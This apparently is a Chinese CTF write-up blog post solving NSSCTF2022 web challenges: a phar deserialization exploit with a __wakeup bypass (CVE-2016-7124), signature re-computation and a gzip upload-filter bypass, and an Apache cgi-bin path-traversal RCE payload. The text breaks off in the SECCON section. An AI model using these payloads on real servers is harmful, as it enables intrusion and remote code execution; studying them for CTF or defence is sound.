<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="NSSCTF2022                           一、1zweb(revenge)       之前的非预期被打烂了，重新出的题                     1.漏洞分析        应该是任意文件读和文件上传过滤啥的。 首先依据任意文件读，拿下源码index.php和upload.php">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB比赛题">
<meta property="og:url" content="http://pig-007.github.io/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="NSSCTF2022                           一、1zweb(revenge)       之前的非预期被打烂了，重新出的题                     1.漏洞分析        应该是任意文件读和文件上传过滤啥的。 首先依据任意文件读，拿下源码index.php和upload.php">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804150413552.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804151519730.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804152809989.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153113690.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153914770.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804154756848.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155731252.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155807904.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114194250871.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114214652469.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204164445320.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165526170.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165929533.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180147150.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180206893.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180433572.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180513310.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180551778.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180733485.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181008635.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181027419.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181229611.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181300249.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181602274.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181807831.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182035159.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182336645.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182410190.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193032520.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193102087.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806194845949.png">
<meta property="article:published_time" content="2022-08-19T05:08:42.000Z">
<meta property="article:modified_time" content="2023-09-11T12:57:02.045Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="比赛">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804150413552.png"><title>WEB比赛题 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">WEB比赛题</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body">
        <h1 id="NSSCTF2022"   >
          <a href="#NSSCTF2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#NSSCTF2022" class="headerlink" title="NSSCTF2022"></a>NSSCTF2022</h1>
      
        <h2 id="一、1zweb-revenge"   >
          <a href="#一、1zweb-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、1zweb-revenge" class="headerlink" title="一、1zweb(revenge)"></a>一、1zweb(revenge)</h2>
      <p>之前的非预期被打烂了，重新出的题</p>

        <h3 id="1-漏洞分析"   >
          <a href="#1-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804150413552.png" alt="image-20220804150413552"></p>
<p>应该是任意文件读和文件上传过滤啥的。</p>
<p>首先依据任意文件读，拿下源码<code>index.php</code>和<code>upload.php</code></p>

        <h4 id="index-php"   >
          <a href="#index-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>给了一个类，猜测可能是<code>php</code>反序列化，同时还有<code>cmd</code>，那么就肯定是<code>php</code>反序列化了，同时使用的是<code>file_get_contents</code>函数，并且没有进行协议过滤，但是远程文件包含不太行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804151519730.png" alt="image-20220804151519730"></p>
<p>那么考虑上传<code>phar</code>文件使用<code>phar</code>协议进行反序列化，<code>phar</code>协议读取文件正常的<code>phar</code>文件时会自动依据<code>.metadata.bin</code>中数据进行反序列化。</p>

        <h4 id="upload-php"   >
          <a href="#upload-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(gettype(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = fopen(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                fclose(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到是上传文件只能是<code>&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;</code>，然后会对<code>phar</code>进行检查，这里其实对<code>phar</code>打个<code>gz</code>压缩包就可以绕过，然后<code>phar</code>协议在读取文件时，发现是<code>gz</code>压缩包会自动进行解压读取。</p>

        <h3 id="2-漏洞利用"   >
          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3>
      <p>首先观察一下给的类</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>

<p>我们传入对应的<code>ljt</code>和<code>dky</code>即可，但是<code>__wakeup</code>会重新赋值，所以需要绕过，尝试使用<code>CVE-2016-7124</code>，满足如下条件。虽然这里不知道怎么判断<code>php</code>版本，但是可以试试嘛。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></div></figure>

<p>那么先使用<code>phar</code>序列化</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        <span class="comment">//phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>运行后得到如下文件，序列化字符串在<code>.metadata.bin</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804152809989.png" alt="image-20220804152809989"></p>
<p>然后需要进行修改，由于存在签名，不能直接修改，需要使用<code>python</code>脚本修改</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="comment">#os.system(&#x27;php exp.php &#123;&#125;&#x27;.format(target))</span></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()<span class="comment">#phar文件</span></span><br><span class="line">file = f1.replace(<span class="string">b&#x27;O:7:&quot;LoveNss&quot;:3:&#123;s:3:&quot;ljt&quot;;s:4:&quot;Misc&quot;;s:3:&quot;dky&quot;;s:2:&quot;Re&quot;;s:3:&quot;cmd&quot;;s:20:&quot;system(\&#x27;cat /flag\&#x27;);&quot;;&#125;&#x27;</span>,<span class="string">b&#x27;O:7:&quot;LoveNss&quot;:4:&#123;s:3:&quot;ljt&quot;;s:4:&quot;Misc&quot;;s:3:&quot;dky&quot;;s:2:&quot;Re&quot;;s:3:&quot;cmd&quot;;s:20:&quot;system(\&#x27;cat /flag\&#x27;);&quot;;&#125;&#x27;</span>)<span class="comment">#修改的内容</span></span><br><span class="line">text = file[:-<span class="number">28</span>]  <span class="comment"># 读取开始到末尾除签名外内容</span></span><br><span class="line">last = file[-<span class="number">8</span>:]  <span class="comment"># 读取最后8位的GBMB和签名flag</span></span><br><span class="line">new_file = text + sha1(text).digest() + last  <span class="comment"># 生成新的文件内容，主要是此时Sha1正确了。</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;phar2.phar&#x27;</span>, <span class="string">&quot;wb&quot;</span>).write(new_file)</span><br></pre></td></tr></table></div></figure>

<p>我们需要修改的就是替换的内容和生成的文件名字即可，运行之后得到如下文件，已经被改变了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153113690.png" alt="image-20220804153113690"></p>
<p>之后用<code>gzip ./phar2.phar</code>打个压缩包，然后改个后缀名为<code>jpg</code>即可上传。</p>
<p>然后使用<code>burpsuite</code>使用<code>phar</code>协议访问即可，如下得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153914770.png" alt="image-20220804153914770"></p>

        <h2 id="二、ez-rce"   >
          <a href="#二、ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、ez-rce" class="headerlink" title="二、ez_rce"></a>二、ez_rce</h2>
      <p>打开靶机啥也没有，<code>dirsearch</code>扫一波。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804154756848.png" alt="image-20220804154756848"></p>
<p>有<code>/cgi-bin/</code>，而且名字<code>rce</code>，猜测<code>apache</code>的<code>cgi-bin</code>漏洞</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/419976985" >Apache49-50任意文件读取与RCE整理 - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>直接<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="line">echo;whoami;ida</span><br></pre></td></tr></table></div></figure>

<p>发现可以，那么直接<code>ls /</code>，查看启动脚本<code>run.sh</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155731252.png" alt="image-20220804155731252"></p>
<p>直接<code>cat</code>得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804155807904.png" alt="image-20220804155807904"></p>

        <h1 id="SECCONCTF2022"   >
          <a href="#SECCONCTF2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#SECCONCTF2022" class="headerlink" title="SECCONCTF2022"></a>SECCONCTF2022</h1>
      
        <h2 id="一、skipinx"   >
          <a href="#一、skipinx" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、skipinx" class="headerlink" title="一、skipinx"></a>一、skipinx</h2>
      
        <h3 id="1-源代码分析："   >
          <a href="#1-源代码分析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-源代码分析：" class="headerlink" title="1.源代码分析："></a>1.源代码分析：</h3>
      <p>在<code>index.js</code>中可以看到</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG ?? <span class="string">&quot;SECCON&#123;dummy&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span 